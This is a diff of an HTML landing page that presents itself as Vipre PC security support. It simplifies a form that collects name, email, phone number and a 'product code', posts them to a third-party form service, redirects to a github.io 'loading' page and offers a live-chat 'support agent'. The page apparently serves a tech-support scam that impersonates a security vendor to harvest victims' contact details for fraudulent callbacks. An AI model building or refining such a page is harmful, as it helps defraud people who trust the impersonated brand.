@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Vipre Global New</title>
+  <title>Vipre Global Latest</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
 
   <!-- Materialize CSS -->
@@ -12,7 +12,6 @@
   <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
 
   <style>
-
     body {
       background: #f5f7fa;
       font-family: Arial, sans-serif;
@@ -69,39 +68,25 @@
     }
 
     footer {
-      background-color: #ffffff !important;
+      background-color: #ffffff;
       color: black;
       padding: 20px;
     }
-
-    .success-message {
-      display: none;
-      color: green;
-      font-weight: bold;
-      margin-top: 15px;
-    }
-
   </style>
 
-  <!-- Smartsupp Live Chat -->
-  <script type="text/javascript">
+  <!-- Smartsupp Chat -->
+  <script>
     var _smartsupp = _smartsupp || {};
     _smartsupp.key = 'b1937b836dadbde1d729303dd3bf8876732a22ee';
 
     window.smartsupp||(function(d) {
       var s,c,o=smartsupp=function(){ o._.push(arguments)};
       o._=[];
-
       s=d.getElementsByTagName('script')[0];
       c=d.createElement('script');
-
-      c.type='text/javascript';
-      c.charset='utf-8';
       c.async=true;
       c.src='https://www.smartsuppchat.com/loader.js?';
-
       s.parentNode.insertBefore(c,s);
-
     })(document);
   </script>
 
@@ -131,295 +116,107 @@
 
     <div class="card-content">
 
-      <span class="card-title">
-        <b>Get Started With Vipre</b>
-      </span>
+      <span class="card-title"><b>Get Started With Vipre</b></span>
 
-      <div class="row">
+      <form action="https://api.web3forms.com/submit" method="POST">
 
-        <form id="form" class="col s12">
+        <!-- ACCESS KEY -->
+        <input type="hidden" name="access_key" value="ee3b4ef7-434d-46b8-b41b-1ec44845b7d0">
 
-          <!-- WEB3FORMS ACCESS KEY -->
-          <input type="hidden"
-                 name="access_key"
-                 value="ee3b4ef7-434d-46b8-b41b-1ec44845b7d0">
+        <!-- SUBJECT -->
+        <input type="hidden" name="subject" value="Vipre Lead">
 
-          <!-- SUBJECT -->
-          <input type="hidden"
-                 name="subject"
-                 value="Vipre Lead">
+        <!-- REDIRECT -->
+        <input type="hidden" name="redirect" value="https://viprestart.github.io/loading.html">
 
-          <!-- REDIRECT -->
-          <input type="hidden"
-                 name="redirect"
-                 value="https://viprestart.github.io/loading.html">
+        <!-- NAME -->
+        <div class="input-field">
+          <input type="text" name="name" required>
+          <label>Full Name</label>
+        </div>
 
-          <!-- SPAM PROTECTION -->
-          <input type="checkbox"
-                 name="botcheck"
-                 style="display:none;">
+        <!-- EMAIL -->
+        <div class="input-field">
+          <input type="email" name="email" required>
+          <label>Email Address</label>
+        </div>
 
-          <!-- NAME -->
-          <div class="input-field col s12">
-            <input name="name" type="text" required>
-            <label>Full Name</label>
-          </div>
+        <!-- PHONE -->
+        <div class="input-field">
+          <input type="tel" name="phone" required>
+          <label>Phone Number</label>
+        </div>
 
-          <!-- EMAIL -->
-          <div class="input-field col s12">
-            <input name="email" type="email" required>
-            <label>Email Address</label>
-          </div>
+        <!-- PRODUCT -->
+        <div class="input-field">
+          <input type="text" name="product" required>
+          <label>Product Code</label>
+        </div>
 
-          <!-- PHONE -->
-          <div class="input-field col s12">
-            <input
-              name="phone"
-              type="tel"
-              pattern="[0-9]{10}"
-              required>
+        <!-- BUTTON -->
+        <div class="center">
+          <button class="btn waves-effect waves-light btn-main" type="submit">
+            Get Started
+            <i class="material-icons right">send</i>
+          </button>
+        </div>
 
-            <label>Phone Number</label>
-          </div>
-
-          <!-- PRODUCT -->
-          <div class="input-field col s12">
-            <input name="product" type="text" required>
-            <label>Product Code</label>
-          </div>
-
-          <!-- BUTTON -->
-          <div class="col s12 center">
-
-            <button class="btn waves-effect waves-light btn-main"
-                    type="submit">
-
-              Get Started
-
-              <i class="material-icons right">send</i>
-
-            </button>
-
-          </div>
-
-          <div id="result" class="success-message"></div>
-
-        </form>
-
-      </div>
+      </form>
 
     </div>
-
   </div>
-
 </div>
 
-<!-- WHY CHOOSE -->
-<div class="container section">
-
-  <h4 class="center">Why Choose Vipre?</h4>
+<!-- FEATURES -->
+<div class="container section center">
+  <h4>Why Choose Vipre?</h4>
 
   <div class="row">
 
     <div class="col s12 m4">
-      <div class="card center">
-        <div class="card-content">
-
-          <i class="material-icons large icon-color">speed</i>
-
-          <h5>Boost Performance</h5>
-
-          <p>Remove junk files and speed up your system instantly.</p>
-
-        </div>
-      </div>
+      <i class="material-icons large icon-color">speed</i>
+      <h5>Boost Performance</h5>
+      <p>Remove junk files and speed up your system instantly.</p>
     </div>
 
     <div class="col s12 m4">
-      <div class="card center">
-        <div class="card-content">
-
-          <i class="material-icons large icon-color">security</i>
-
-          <h5>Privacy Protection</h5>
-
-          <p>Keep your browsing safe and your data protected.</p>
-
-        </div>
-      </div>
+      <i class="material-icons large icon-color">security</i>
+      <h5>Privacy Protection</h5>
+      <p>Keep your browsing safe and your data protected.</p>
     </div>
 
     <div class="col s12 m4">
-      <div class="card center">
-        <div class="card-content">
-
-          <i class="material-icons large icon-color">build</i>
-
-          <h5>Easy Optimization</h5>
-
-          <p>Clean and maintain your PC in just a few clicks.</p>
-
-        </div>
-      </div>
+      <i class="material-icons large icon-color">build</i>
+      <h5>Easy Optimization</h5>
+      <p>Clean and maintain your PC in just a few clicks.</p>
     </div>
 
   </div>
-
 </div>
 
 <!-- HOW IT WORKS -->
-<div class="how-section">
-
-  <div class="container center">
-
-    <h4>How It Works</h4>
-
-    <div class="row">
-
-      <div class="col s12 m4">
-
-        <i class="material-icons large icon-color">person</i>
-
-        <h6>Submit Request</h6>
-
-        <p>Fill in your details and describe your issue.</p>
-
-      </div>
-
-      <div class="col s12 m4">
-
-        <i class="material-icons large icon-color">support_agent</i>
-
-        <h6>Get Assistance</h6>
-
-        <p>Our expert will contact you shortly.</p>
-
-      </div>
-
-      <div class="col s12 m4">
-
-        <i class="material-icons large icon-color">check_circle</i>
-
-        <h6>Problem Solved</h6>
-
-        <p>We ensure your system runs smoothly again.</p>
-
-      </div>
-
-    </div>
-
-  </div>
-
-</div>
-
-<!-- TRUST -->
-<div class="container section center">
-
-  <h5 style="color:#007bff;">
-    Trusted by Millions Worldwide
-  </h5>
-
-  <p>
-    Vipre is one of the most popular PC Security tools with millions of satisfied users globally.
-  </p>
-
+<div class="how-section center">
+  <h4>How It Works</h4>
+  <p>Submit → Get Assistance → Problem Solved</p>
 </div>
 
 <!-- CHAT -->
-<div class="chat-section">
-
+<div class="chat-section center">
   <h4>Need Immediate Help?</h4>
+  <p>Chat with our support team instantly</p>
 
-  <p>
-    Chat with our support representative and resolve your issue instantly.
-  </p>
-
-  <a class="btn white red-text waves-effect waves-light"
+  <a class="btn white red-text"
      onclick="smartsupp('chat:open')">
-
     Chat Now
-
   </a>
-
 </div>
 
 <!-- FOOTER -->
-<footer class="page-footer">
-
-  <div class="container center">
-
-    © 2026 Vipre Docs
-
-  </div>
-
+<footer class="center">
+  © 2026 Vipre Docs
 </footer>
 
-<!-- Materialize JS -->
 <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/materialize.min.js"></script>
-
-<!-- WEB3FORMS SCRIPT -->
-<script>
-
-const form = document.getElementById('form');
-const result = document.getElementById('result');
-
-form.addEventListener('submit', function(e) {
-
-  e.preventDefault();
-
-  const formData = new FormData(form);
-  const object = Object.fromEntries(formData);
-  const json = JSON.stringify(object);
-
-  result.style.display = "block";
-  result.innerHTML = "Please wait...";
-
-  fetch('https://api.web3forms.com/submit', {
-
-    method: 'POST',
-
-    headers: {
-      'Content-Type': 'application/json',
-      'Accept': 'application/json'
-    },
-
-    body: json
-
-  })
-
-  .then(async (response) => {
-
-    let json = await response.json();
-
-    if (response.status == 200) {
-
-      result.innerHTML = "Form submitted successfully!";
-
-      window.location.href = "https://viprestart.github.io/loading.html";
-
-    } else {
-
-      result.innerHTML = json.message;
-
-    }
-
-  })
-
-  .catch(error => {
-
-    result.innerHTML = "Something went wrong!";
-
-  })
-
-  .then(function() {
-
-    form.reset();
-
-  });
-
-});
-
-</script>
 
 </body>
 </html>
